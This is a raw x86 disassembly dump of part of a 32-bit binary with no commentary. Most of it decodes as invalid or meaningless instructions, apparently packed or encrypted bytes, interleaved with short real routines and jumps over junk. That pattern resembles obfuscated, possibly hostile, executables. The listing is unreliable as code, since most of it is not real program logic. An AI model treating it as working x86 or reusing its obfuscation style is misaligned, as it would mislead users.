  406168:	sbb    BYTE PTR [ecx+0x2b86160c],0xc2
  40616f:	xchg   DWORD PTR [ebx-0x47a606cc],esi
  406175:	add    al,0x7d
  406177:	(bad)  
  406178:	mov    eax,0xde6f3d36
  40617d:	lods   al,BYTE PTR ds:[esi]
  40617e:	adc    dl,BYTE PTR [ebx+edi*8-0x7b]
  406182:	sub    edx,edi
  406184:	or     edx,DWORD PTR [edi-0x23]
  406187:	push   cs
  406188:	cdq    
  406189:	cmp    eax,0xb517ec2b
  40618e:	int    0xe8
  406190:	xor    al,0x7e
  406192:	sbb    esp,esi
  406194:	add    ebp,DWORD PTR [ebx-0x5f]
  406197:	sub    BYTE PTR [edi],0xe2
  40619a:	adc    BYTE PTR [edi-0x6],bl
  40619d:	retf   0xd575
  4061a0:	stos   BYTE PTR es:[edi],al
  4061a1:	jecxz  0x4061c1
  4061a3:	dec    esp
  4061a4:	xchg   esp,eax
  4061a5:	int    0xcd
  4061a7:	call   0xa7259862
  4061ac:	sbb    DWORD PTR [ebp+0x24],esi
  4061af:	lahf   
  4061b0:	cmp    al,0x4f
  4061b2:	sbb    al,BYTE PTR [ebx]
  4061b4:	inc    edi
  4061b5:	and    eax,ebx
  4061b7:	push   DWORD PTR [eax]
  4061b9:	jno    0x406209
  4061bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061bc:	xchg   edx,eax
  4061bd:	enter  0xba59,0xc9
  4061c1:	scas   eax,DWORD PTR es:[edi]
  4061c2:	nop
  4061c3:	(bad)
  4061c6:	(bad)  
  4061c7:	xor    eax,0x367f2a4f
  4061cc:	mov    dl,dl
  4061ce:	scas   al,BYTE PTR es:[edi]
  4061cf:	dec    ebp
  4061d0:	in     al,dx
  4061d1:	inc    ebp
  4061d2:	push   ds
  4061d3:	in     eax,dx
  4061d4:	push   ds
  4061d5:	inc    eax
  4061d6:	xor    esp,DWORD PTR [edi]
  4061d8:	hlt    
  4061d9:	(bad)  
  4061da:	xchg   DWORD PTR [esi+0x7f],edx
  4061dd:	fwait
  4061de:	scas   eax,DWORD PTR es:[edi]
  4061df:	xchg   DWORD PTR [esi+0x5e],edi
  4061e2:	or     BYTE PTR [ebx-0x2],0x82
  4061e6:	dec    eax
  4061e7:	xor    eax,0xe825d65b
  4061ec:	rcr    DWORD PTR [esi],cl
  4061ee:	or     DWORD PTR [eax],eax
  4061f0:	mov    bh,0x6b
  4061f2:	sbb    DWORD PTR [ecx-0x25ecfc9d],ebp
  4061f8:	xchg   edi,eax
  4061f9:	push   0xffffff9b
  4061fb:	call   0x945e:0x4eeec731
  406202:	gs xor eax,0x98ef5827
  406208:	rcr    DWORD PTR [edx],cl
  40620a:	xchg   BYTE PTR ds:0xb43027b5,dh
  406210:	sub    al,0x79
  406212:	scas   al,BYTE PTR es:[edi]
  406213:	ret    0x7264
  406216:	int    0x44
  406218:	mov    ds:0x44c101de,eax
  40621d:	xchg   ebp,eax
  40621e:	sbb    al,0xe4
  406220:	setle  bl
  406223:	or     al,0xc
  406225:	fcomp  DWORD PTR [ecx+0x35fec365]
  40622b:	sbb    ah,BYTE PTR [edx]
  40622d:	es fwait
  40622f:	addr16 aas 
  406231:	(bad)  
  406232:	(bad)  
  406233:	out    dx,eax
  406234:	dec    ebp
  406235:	dec    ebx
  406236:	inc    edi
  406237:	mov    al,ds:0x7ee033f0
  40623c:	ins    BYTE PTR es:[edi],dx
  40623d:	jle    0x406250
  40623f:	or     eax,0x54d9b420
  406244:	adc    eax,0x43a8ea82
  406249:	sub    BYTE PTR [ebx-0x2a],ch
  40624c:	xor    al,0x0
  40624e:	daa    
  40624f:	into   
  406250:	pusha  
  406251:	shl    BYTE PTR [ecx],1
  406253:	mov    dl,0xc0
  406255:	jmp    0x46cc:0xde0d08d6
  40625c:	dec    edi
  40625d:	out    0x3c,al
  40625f:	and    esi,DWORD PTR [edi-0x6b]
  406262:	cwde   
  406263:	hlt    
  406264:	push   edi
  406265:	leave  
  406266:	and    bl,BYTE PTR [eax+ebx*2-0x4d24f152]
  40626d:	ss icebp 
  40626f:	shr    BYTE PTR [edi],cl
  406271:	test   eax,0xcada2f6d
  406276:	mov    eax,ds:0xd46553ce
  40627b:	or     DWORD PTR [eax+0x31],0x6e93e399
  406282:	jo     0x4062c0
  406284:	xor    DWORD PTR [esi-0x3a8654],esp
  40628a:	cmc    
  40628b:	add    bl,BYTE PTR [ecx-0x238b929]
  406291:	cmp    DWORD PTR [ebx],eax
  406293:	push   ecx
  406294:	(bad)  
  406296:	pop    ecx
  406297:	mov    cl,0xc0
  406299:	mov    esi,DWORD PTR [ebp-0x8]
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43371f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	int    0x14
  4062ee:	mov    ds:0x7c3b34c1,al
  4062f3:	jl     0x406325
  4062f5:	jle    0x406373
  4062f7:	jl     0x40630e
  4062f9:	pop    ecx
  4062fa:	jl     0x406346
  4062fc:	inc    esp
  4062fd:	add    BYTE PTR [ecx+ebx*4-0x2ecf1039],0xdf
  406305:	mov    dl,0xa
  406307:	inc    ebp
  406308:	inc    esi
  406309:	ins    BYTE PTR es:[edi],dx
  40630a:	cmp    eax,esp
  40630c:	cs retf 
  40630e:	stos   DWORD PTR es:[edi],eax
  40630f:	jle    0x4062a7
  406311:	enter  0x4705,0x82
  406315:	scas   eax,DWORD PTR es:[edi]
  406316:	cmp    DWORD PTR [edx],eax
  406318:	mov    dh,0x11
  40631a:	sti    
  40631b:	mov    ss,ecx
  40631d:	lods   al,BYTE PTR ds:[esi]
  40631e:	add    al,dl
  406320:	pop    esp
  406321:	into   
  406322:	in     eax,dx
  406323:	jp     0x40635f
  406325:	xchg   DWORD PTR [edi-0x46],esp
  406328:	retf   
  406329:	pop    es
  40632a:	pop    edx
  40632b:	lock or DWORD PTR [edi+0x34],eax
  40632f:	pop    ecx
  406330:	mov    ah,bh
  406332:	pop    edi
  406333:	xor    ecx,DWORD PTR [edi+0x53]
  406336:	sar    BYTE PTR [edx*1+0x186315a0],1
  40633d:	cli    
  40633e:	push   ss
  40633f:	sbb    al,0xed
  406341:	push   edx
  406342:	adc    edx,esp
  406344:	std    
  406345:	push   0xea5c3221
  40634a:	scas   eax,DWORD PTR es:[edi]
  40634b:	sahf   
  40634c:	popa   
  40634d:	xlat   BYTE PTR fs:[ebx]
  40634f:	inc    ebx
  406350:	arpl   WORD PTR [edi+0x2],sp
  406353:	mov    ebx,0xda2cf516
  406358:	mov    eax,0xddd5606f
  40635d:	xchg   esp,eax
  40635e:	es dec edi
  406360:	sub    al,0x6b
  406362:	xor    al,0x66
  406364:	ds mov esp,0x54fa98af
  40636a:	sub    al,0x10
  40636c:	and    bh,BYTE PTR [edx-0x65]
  40636f:	retf   0x6ff1
  406372:	mov    al,ds:0xd2efdb01
  406377:	sahf   
  406378:	mov    esp,fs
  40637a:	adc    eax,0x97a8808b
  40637f:	call   0x653f0db3
  406384:	es ret 
  406386:	jecxz  0x406328
  406388:	mov    bl,0x39
  40638a:	js     0x406311
  40638c:	fisttp QWORD PTR [eax+0x65]
  40638f:	xor    BYTE PTR [ebx+ecx*8],dl
  406392:	adc    BYTE PTR [eax-0x22],dh
  406395:	cs clc 
  406397:	mov    esp,0x97d8215a
  40639c:	ins    DWORD PTR es:[edi],dx
  40639d:	out    0x13,eax
  40639f:	push   0xffffff87
  4063a1:	lock and dh,BYTE PTR [edx-0x5e0f1823]
  4063a8:	or     edx,ebp
  4063aa:	cmp    eax,0xa5f22f38
  4063af:	or     ecx,DWORD PTR [eax+0x26dc98ae]
  4063b5:	sub    BYTE PTR [ecx+0x50],cl
  4063b8:	imul   ebx,ebp,0x1f0b4deb
  4063be:	jno    0x406399
  4063c0:	mov    ebx,0xf2d566bd
  4063c5:	inc    esp
  4063c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c7:	mov    esi,0x88e59ceb
  4063cc:	jle    0x4063f0
  4063ce:	add    DWORD PTR [ebx+0x37],esi
  4063d1:	mov    al,BYTE PTR [esi]
  4063d3:	dec    ebx
  4063d4:	addr16 mov ecx,0x56846208
  4063da:	test   al,0x1c
  4063dc:	mov    ebx,DWORD PTR [edx+edi*1]
  4063df:	dec    eax
  4063e0:	pop    edi
  4063e1:	data16 sar BYTE PTR [ecx-0x39aa4c64],1
  4063e8:	push   ebp
  4063e9:	repz jl 0x40638d
  4063ec:	test   al,0x6b
  4063ee:	add    bl,BYTE PTR [eax]
  4063f0:	leave  
  4063f1:	pop    es
  4063f2:	fisub  WORD PTR [edi+ebp*2+0x43b020f5]
  4063f9:	add    BYTE PTR [esi-0xed7b19b],cl
  4063ff:	and    al,0xca
  406401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406402:	sbb    eax,eax
  406404:	jp     0x406426
  406406:	les    ecx,FWORD PTR [edx-0x2e6e7bf9]
  40640c:	jbe    0x40640a
  40640e:	jnp    0x4063bf
  406410:	sbb    ebp,DWORD PTR [eax+0x754ee5f0]
  406416:	popf   
  406417:	ret    0x3a84
  40641a:	sbb    DWORD PTR [edx+edi*8],0x8817e0b8
  406421:	test   eax,0xce4229d6
  406426:	pop    ebx
  406427:	stos   BYTE PTR es:[edi],al
  406428:	(bad)  [ebx-0xf1ef174]
  40642e:	or     eax,0x284b5ced
  406433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406435:	and    DWORD PTR [edi+0x43f630eb],ebp
  40643b:	rcr    edi,0x2a
  40643e:	test   DWORD PTR [edi+edi*4],esi
  406441:	(bad)  
  406442:	cld    
  406443:	xor    esi,DWORD PTR [ebx]
  406445:	sub    BYTE PTR [ecx+eax*1-0x1a],cl
  406449:	dec    ecx
  40644a:	(bad)  
  40644b:	repnz pushf 
  40644d:	dec    ecx
  40644e:	mov    ebx,DWORD PTR [ebx+0x10]
  406451:	cmp    BYTE PTR [ecx+0x2cfb9dca],ah
  406457:	outs   dx,DWORD PTR ds:[esi]
  406458:	sbb    BYTE PTR [ecx],ch
  40645a:	(bad)  
  40645b:	mov    esi,0x37e461ad
  406460:	mov    ah,0x8f
  406462:	loopne 0x406489
  406464:	es mov bh,0xdb
  406467:	test   BYTE PTR [ebp+0x16c2dac0],bh
  40646d:	xor    al,0x25
  40646f:	loop   0x4063fb
  406471:	repz xchg ebp,eax
  406473:	sub    bl,dl
  406475:	add    edi,edi
  406477:	test   BYTE PTR [edx],dh
  406479:	sbb    DWORD PTR [ebx],eax
  40647b:	mov    eax,ds:0xe7868a9c
  406480:	daa    
  406481:	jae    0x406449
  406483:	lock pop es
  406485:	retf   
  406486:	mov    ds:0x94622ca0,al
  40648b:	push   esp
  40648c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648d:	mov    edx,0xda3a0a05
  406492:	idiv   ebp
  406494:	mov    ecx,0x922986d7
  406499:	daa    
  40649a:	fwait
  40649b:	add    al,0x8a
  40649d:	ja     0x4064d7
  40649f:	xchg   edi,eax
  4064a0:	cli    
  4064a1:	call   0xf355:0x577f6569
  4064a8:	push   cs
  4064a9:	push   0xfffffffa
  4064ab:	sbb    BYTE PTR [edx],bh
  4064ad:	xchg   ebx,eax
  4064ae:	xchg   edx,eax
  4064af:	jmp    0xb0ddac14
  4064b4:	sub    BYTE PTR [eax+0x1aad4fe9],dl
  4064ba:	lds    ecx,FWORD PTR [ebx+0x7a3a3095]
  4064c0:	and    BYTE PTR [edi],0x4f
  4064c3:	bswap  edi
  4064c5:	addr16 jge 0x4064df
  4064c8:	cmp    al,0xde
  4064ca:	jle    0x4064e1
  4064cc:	cmp    ebx,DWORD PTR [ebp+0x26d71be2]
  4064d2:	(bad)  
  4064d3:	gs out dx,eax
  4064d5:	cmp    eax,0xea5f498a
  4064da:	xor    dl,BYTE PTR [edx]
  4064dc:	add    DWORD PTR [ebp+0x68],esi
  4064df:	dec    edi
  4064e0:	jnp    0x406527
  4064e2:	fstp   TBYTE PTR [ecx-0x2e5b6469]
  4064e8:	mov    dl,bl
  4064ea:	xchg   ebp,eax
  4064eb:	push   esi
  4064ec:	rol    ebp,1
  4064ee:	popa   
  4064ef:	test   DWORD PTR ds:0xfe86a681,ecx
  4064f5:	or     DWORD PTR [edi-0xa],edi
  4064f8:	cdq    
  4064f9:	cmp    DWORD PTR [esi],ecx
  4064fb:	inc    esp
  4064fc:	adc    eax,0xddd98d36
  406501:	push   ecx
  406502:	das    
  406503:	retf   
  406504:	push   edi
  406505:	jge    0x4064ee
  406507:	or     ch,al
  406509:	mov    ch,0x46
  40650b:	push   es
  40650c:	(bad)  
  40650d:	push   esp
  40650e:	in     al,0x7a
  406510:	adc    al,0xd0
  406512:	or     eax,ecx
  406514:	push   ss
  406515:	clc    
  406516:	repz xlat BYTE PTR ds:[ebx]
  406518:	cmp    ah,bl
  40651a:	addr16 jns 0x406581
  40651d:	push   ebx
  40651e:	das    
  40651f:	adc    edi,ebx
  406521:	aad    0x11
  406523:	loope  0x4064df
  406525:	stos   BYTE PTR es:[edi],al
  406526:	ins    DWORD PTR es:[edi],dx
  406527:	(bad)  
  406528:	mov    ebp,0xebde82aa
  40652d:	mov    ecx,esi
  40652f:	fst    DWORD PTR [ebx+0x4a]
  406532:	pop    ds
  406533:	or     DWORD PTR [ecx-0x48],edx
  406536:	or     DWORD PTR [eax+0x0],0xfc9eb800
  40653d:	mov    ds:0xfc458905,eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x433727,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x4337df,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x4336db,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x43375f,0x0
  406580:	mov    ecx,DWORD PTR ds:0x43375f
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x43375f,ecx
  40658d:	cmp    DWORD PTR ds:0x43375f,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x43375f,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x43375f
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x43375f,ecx
  4065bf:	cmp    DWORD PTR ds:0x43375f,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0x6695211a
  4065de:	adc    DWORD PTR [ebx+0x7cc5e8d4],0x7c7e307c
  4065e8:	jl     0x40660a
  4065ea:	aam    0xa8
  4065ec:	mov    edi,0xfbdbfde6
  4065f1:	je     0x406666
  4065f3:	mov    esi,0x1001b8cb
  4065f8:	in     al,0x7b
  4065fa:	jbe    0x4065ba
  4065fc:	pop    ecx
  4065fd:	cli    
  4065fe:	in     eax,dx
  4065ff:	cs addr16 pop eax
  406602:	sbb    esi,eax
  406604:	pop    ebx
  406605:	xor    ebp,DWORD PTR [eax-0x7baa1e2f]
  40660b:	xchg   BYTE PTR [esi-0x5bc56375],ch
  406611:	or     bl,cl
  406613:	dec    esi
  406614:	iret   
  406615:	add    ecx,DWORD PTR [ecx+0x4c096610]
  40661b:	and    eax,0x43f96e4a
  406620:	adc    DWORD PTR [edx+0x1],edx
  406623:	in     eax,0xdd
  406625:	jbe    0x40663e
  406627:	inc    esi
  406628:	and    DWORD PTR [esi+ecx*1+0x4575df69],ebp
  40662f:	pop    ecx
  406630:	cwde   
  406631:	sbb    edi,ecx
  406633:	or     BYTE PTR [edx+0x7d8873e7],dl
  406639:	lds    esp,FWORD PTR [ebp+edx*4-0x3d328d67]
  406640:	dec    ebp
  406641:	inc    edi
  406642:	fs sub edx,ecx
  406645:	test   eax,0xdb74ef07
  40664a:	inc    edx
  40664b:	mov    ecx,0x7a115fb
  406650:	sar    BYTE PTR [esi],1
  406652:	jo     0x4065fd
  406654:	enter  0xa59,0x11
  406658:	dec    esi
  406659:	add    ecx,DWORD PTR [ecx]
  40665b:	mov    ch,0xa7
  40665d:	loop   0x4065ff
  40665f:	dec    ebp
  406660:	icebp  
  406661:	pop    ss
  406662:	es sbb bh,ah
  406665:	imul   BYTE PTR [esi]
  406667:	fimul  WORD PTR [eax-0x2ecf061d]
  40666d:	and    DWORD PTR [edi+0x2a3c29c4],edx
  406673:	call   0xe95db799
  406678:	jecxz  0x4066d8
  40667a:	inc    ebp
  40667b:	(bad)  
  40667c:	and    DWORD PTR gs:[edi],ecx
  40667f:	pop    eax
  406680:	in     eax,dx
  406681:	xchg   esp,eax
  406682:	gs scas eax,DWORD PTR es:[edi]
  406684:	push   ecx
  406685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406686:	dec    esp
  406687:	aam    0xbc
  406689:	test   eax,0xfdf4f2a2
  40668e:	cs pop ebp
  406690:	bnd ret 
  406692:	add    ebx,edx
  406694:	shl    DWORD PTR [eax+0x1956892],0x19
  40669b:	stos   DWORD PTR es:[edi],eax
  40669c:	cwde   
  40669d:	jno    0x4066f6
  40669f:	jl     0x4066f5
  4066a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066a2:	jge    0x4066c7
  4066a4:	popa   
  4066a5:	pop    ebp
  4066a6:	mov    dh,dh
  4066a8:	arpl   WORD PTR [edx],ax
  4066aa:	cmp    al,0x73
  4066ac:	cld    
  4066ad:	sti    
  4066ae:	add    DWORD PTR [edi-0x39],edi
  4066b1:	mov    edx,0x623adeab
  4066b6:	ja     0x4066ca
  4066b8:	mov    eax,0x38c9f136
  4066bd:	jg     0x406735
  4066bf:	shl    cl,1
  4066c1:	in     eax,0xc1
  4066c3:	scas   eax,DWORD PTR es:[edi]
  4066c4:	jne    0x40671d
  4066c6:	jo     0x40667f
  4066c8:	sub    esp,ebx
  4066ca:	or     esi,DWORD PTR [ebx-0x1c]
  4066cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066ce:	or     BYTE PTR [esi+0x6e],cl
  4066d1:	cmp    DWORD PTR [esi],esi
  4066d3:	sbb    dl,BYTE PTR [edx+0xf233b]
  4066d9:	pop    esp
  4066da:	js     0x406712
  4066dc:	mov    eax,0xd383f06e
  4066e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066e2:	or     ebx,DWORD PTR [edx]
  4066e4:	das    
  4066e5:	jmp    0x406723
  4066e7:	call   0x269e5070
  4066ec:	mov    bl,0xb3
  4066ee:	stc    
  4066ef:	and    BYTE PTR [ebx+0x5f6e30c6],0x49
  4066f6:	fs (bad) 
  4066f8:	xchg   ecx,eax
  4066f9:	popa   
  4066fa:	or     BYTE PTR [ebx+0x10c1ec1a],0xb5
  406701:	stos   DWORD PTR es:[edi],eax
  406702:	sbb    cl,BYTE PTR [esi]
  406704:	jmp    0x9d53399f
  406709:	mov    ebx,0x82e556c2
  40670e:	and    ch,BYTE PTR [esi+0x3f3f0908]
  406714:	jo     0x40669b
  406716:	aad    0x2f
  406718:	pop    ebp
  406719:	push   ebp
  40671a:	cdq    
  40671b:	dec    ecx
  40671c:	push   eax
  40671d:	push   ebp
  40671e:	jmp    0x4066ae
  406720:	sbb    ah,BYTE PTR [ebx+0x8ec695]
  406726:	and    DWORD PTR [esi],edx
  406728:	adc    cl,BYTE PTR [edi-0x21a8f1f7]
  40672e:	addr16 jo 0x406702
  406731:	sub    eax,0xe8ff539c
  406736:	(bad)  
  406738:	pop    esp
  406739:	ja     0x406751
  40673b:	icebp  
  40673c:	aaa    
  40673d:	ror    DWORD PTR [ebx-0x982f8a7],1
  406743:	cld    
  406744:	(bad)  
  406745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406746:	lods   al,BYTE PTR ds:[esi]
  406747:	pop    edi
  406748:	add    DWORD PTR [esi+0x10],ebx
  40674b:	retf   
  40674c:	mov    al,ds:0x63e029c0
  406751:	xchg   esi,eax
  406752:	pop    edi
  406753:	icebp  
  406754:	jns    0x406766
  406756:	sub    al,0xaf
  406758:	fs pushf 
  40675a:	pop    edx
  40675b:	cmp    DWORD PTR [eax],ebx
  40675d:	retf   
  40675e:	xor    al,BYTE PTR [ecx+0x14]
  406761:	cwde   
  406762:	jmp    0x22d0:0x149318c6
  406769:	cmp    dl,bh
  40676b:	push   ecx
  40676c:	aas    
  40676d:	les    ebp,FWORD PTR ds:0x483b47e9
  406773:	in     eax,dx
  406774:	xchg   ecx,eax
  406775:	outs   dx,BYTE PTR ds:[esi]
  406776:	sub    al,0xf5
  406778:	cwde   
  406779:	pusha  
  40677a:	sti    
  40677b:	pop    es
  40677c:	(bad)  
  40677d:	pop    ebp
  40677e:	mov    eax,DWORD PTR [edx-0xa]
  406781:	xchg   esp,eax
  406782:	(bad)  
  406784:	loopne 0x406800
  406786:	or     eax,esp
  406788:	jmp    0xb550:0x869225f1
  40678f:	push   ebp
  406790:	out    dx,eax
  406791:	jb     0x406782
  406793:	ret    0x9a9
  406796:	aam    0x32
  406798:	xchg   ebx,eax
  406799:	and    cl,ch
  40679b:	add    eax,0xba3a8b62
  4067a0:	ins    BYTE PTR es:[edi],dx
  4067a1:	fmul   DWORD PTR [ebx+0x38]
  4067a4:	int3   
  4067a5:	loope  0x40675c
  4067a7:	push   ecx
  4067a8:	mov    ds:0x64242bed,al
  4067ad:	gs jnp 0x406742
  4067b0:	out    0x4,eax
  4067b2:	push   cs
  4067b3:	fwait
  4067b4:	stc    
  4067b5:	loop   0x4067ea
  4067b7:	mov    bl,0xd7
  4067b9:	in     eax,dx
  4067ba:	cdq    
  4067bb:	fbstp  TBYTE PTR [eax-0x7e]
  4067be:	jno    0x4067fa
  4067c0:	sar    cl,1
  4067c2:	fild   DWORD PTR [esi]
  4067c4:	pop    ecx
  4067c5:	or     esp,edx
  4067c7:	sahf   
  4067c8:	mov    esp,0xb94462f0
  4067cd:	ffree  st(0)
  4067cf:	fcomip st,st(7)
  4067d1:	retf   0x69fe
  4067d4:	(bad)  
  4067d5:	mov    edx,0xa9c163fb
  4067da:	ret    0xd717
  4067dd:	cmc    
  4067de:	rol    DWORD PTR [edx],cl
  4067e0:	jnp    0x4067d8
  4067e2:	popf   
  4067e3:	(bad)  
  4067e4:	retf   0xa93f
  4067e7:	fsubr  QWORD PTR [edi]
  4067e9:	pop    edx
  4067ea:	data16 rcl BYTE PTR ds:0xa798c262,0x0
  4067f2:	or     BYTE PTR [ebp-0x2c],ch
  4067f5:	sub    ebp,edx
  4067f7:	js     0x406836
  4067f9:	imul   edi,DWORD PTR [ebp-0x2c],0x26063394
  406800:	mov    ah,0x5c
  406802:	jbe    0x40684b
  406804:	ret    
  406805:	xor    al,0x83
  406807:	in     al,0x76
  406809:	mov    esp,0x439ee312
  40680e:	ins    DWORD PTR es:[edi],dx
  40680f:	sub    ecx,0xffffffc0
  406812:	mov    ch,0xbd
  406814:	push   es
  406815:	adc    al,0xda
  406817:	and    eax,0x5070a83a
  40681c:	adc    eax,0x60828248
  406821:	test   al,0x1b
  406823:	push   edx
  406824:	es mov ecx,0x8a3a
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xde79afcb
  40683e:	jmp    0x7cbd2fef
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x406846
  406848:	outs   dx,DWORD PTR ds:[esi]
  406849:	xchg   ebp,eax
  40684a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40684b:	xchg   ebp,eax
  40684c:	push   DWORD PTR [edi+0x6fd5d22a]
  406852:	(bad)  
  406853:	jmp    0x40688e
  406855:	lahf   
  406856:	push   0x160c893c
  40685b:	lods   al,BYTE PTR ds:[esi]
  40685c:	loopne 0x406899
  40685e:	retf   0xa0d6
  406861:	jbe    0x40680f
  406863:	push   ss
  406864:	out    0x46,al
  406866:	loopne 0x40683a
  406868:	pop    es
  406869:	mov    eax,ds:0xa2e13214
  40686e:	inc    esi
  40686f:	sbb    DWORD PTR [ecx+0x11],0xc831d5fa
  406876:	aaa    
  406877:	popa   
  406878:	retf   0xbfb7
  40687b:	xchg   ebp,eax
  40687c:	mov    bl,0xe4
  40687e:	test   eax,0x1edec6ea
  406883:	xchg   esi,eax
  406884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406885:	push   edx
  406886:	inc    ebx
  406887:	dec    edi
  406888:	push   ecx
  406889:	out    0x41,eax
  40688b:	fnstcw WORD PTR [edx]
  40688d:	push   0xd8b8ea59
  406892:	enter  0x78e,0x27
  406896:	loope  0x406823
  406898:	pop    esp
  406899:	lods   al,BYTE PTR ds:[esi]
  40689a:	adc    al,0x15
  40689c:	cmp    BYTE PTR [ecx+0x2],dh
  40689f:	mov    ecx,0xe651f1ce
  4068a4:	adc    bl,dh
  4068a6:	push   ebx
  4068a7:	in     al,dx
  4068a8:	lods   al,BYTE PTR ds:[esi]
  4068a9:	xchg   esi,eax
  4068aa:	mov    dh,0x3c
  4068ac:	mov    esp,0xfe0b9090
  4068b1:	cmp    bh,ch
  4068b3:	push   esp
  4068b4:	(bad)  
  4068b5:	jmp    0xeb5e:0x230e6b73
  4068bc:	call   DWORD PTR [edi-0x6c]
  4068bf:	mov    ss,WORD PTR [eax-0x4]
  4068c2:	inc    ebx
  4068c3:	jge    0x406933
  4068c5:	and    DWORD PTR [esi+0x68a6be2c],ebp
  4068cb:	push   ebx
  4068cc:	add    dl,BYTE PTR [ebp+ecx*8-0x1f3a0406]
  4068d3:	adc    DWORD PTR [edx],ebx
  4068d5:	into   
  4068d6:	jno    0x406927
  4068d8:	mov    ds:0xd52700cf,al
  4068dd:	mov    edx,0x66e8cbc
  4068e2:	addr16 dec edi
  4068e4:	hlt    
  4068e5:	inc    esi
  4068e6:	or     BYTE PTR [edx+0x6b],dh
  4068e9:	mov    ds:0x68157795,eax
  4068ee:	lods   al,BYTE PTR ds:[esi]
  4068ef:	pop    es
  4068f0:	imul   edx,DWORD PTR [esi+0x33],0xffffff9b
  4068f4:	add    al,0x54
  4068f6:	(bad)  
  4068f7:	(bad)  
  4068f9:	or     BYTE PTR [esi],0xad
  4068fc:	jb     0x4068df
  4068fe:	(bad)  
  4068ff:	ss and eax,0xa073fc14
  406905:	adc    BYTE PTR [esi],0x85
  406908:	fwait
  406909:	pushf  
  40690a:	mov    bh,0xb0
  40690c:	mov    esi,DWORD PTR [edi]
  40690e:	ja     0x406961
  406910:	sbb    al,0x9a
  406912:	xor    edi,DWORD PTR [ebp+0x34]
  406915:	sbb    dl,cl
  406917:	dec    ebp
  406918:	stos   DWORD PTR es:[edi],eax
  406919:	lahf   
  40691a:	adc    eax,0x1eb15f82
  40691f:	retf   
  406920:	push   edx
  406921:	sbb    DWORD PTR ds:0xeaa942bd,eax
  406927:	jae    0x406908
  406929:	xchg   ecx,eax
  40692a:	push   ebx
  40692b:	inc    esi
  40692c:	ret    0xb962
  40692f:	add    ch,BYTE PTR [ebp-0x7c]
  406932:	jl     0x406953
  406934:	lods   al,BYTE PTR ds:[esi]
  406935:	xor    al,al
  406937:	cmc    
  406938:	adc    al,0x21
  40693a:	jbe    0x4068c9
  40693c:	xor    ecx,esi
  40693e:	sbb    DWORD PTR [ebp-0x87f1031],0xffffff91
  406945:	iret   
  406946:	mov    ebx,0x1b22e542
  40694b:	hlt    
  40694c:	push   ss
  40694d:	mov    esi,0x61c9f11
  406952:	dec    ecx
  406953:	repnz sub bl,BYTE PTR [edx+0x25]
  406957:	jmp    0x40691f
  406959:	add    al,0xa1
  40695b:	xchg   ebx,eax
  40695c:	adc    ecx,DWORD PTR [esi]
  40695e:	call   0x591a5ee4
  406963:	pop    eax
  406964:	icebp  
  406965:	cmp    eax,0x2161d099
  40696a:	(bad)  
  40696b:	repnz int3 
  40696d:	leave  
  40696e:	je     0x406972
  406970:	retf   0x4490
  406973:	push   es
  406974:	push   esp
  406975:	in     al,dx
  406976:	xchg   ebx,eax
  406977:	mov    edi,0x68510edc
  40697c:	popf   
  40697d:	mov    eax,ds:0x31170078
  406982:	arpl   bp,ax
  406984:	mov    esp,0x5eca44ea
  406989:	nop
  40698a:	daa    
  40698b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40698c:	mov    edx,0x479c1e1c
  406991:	(bad)  
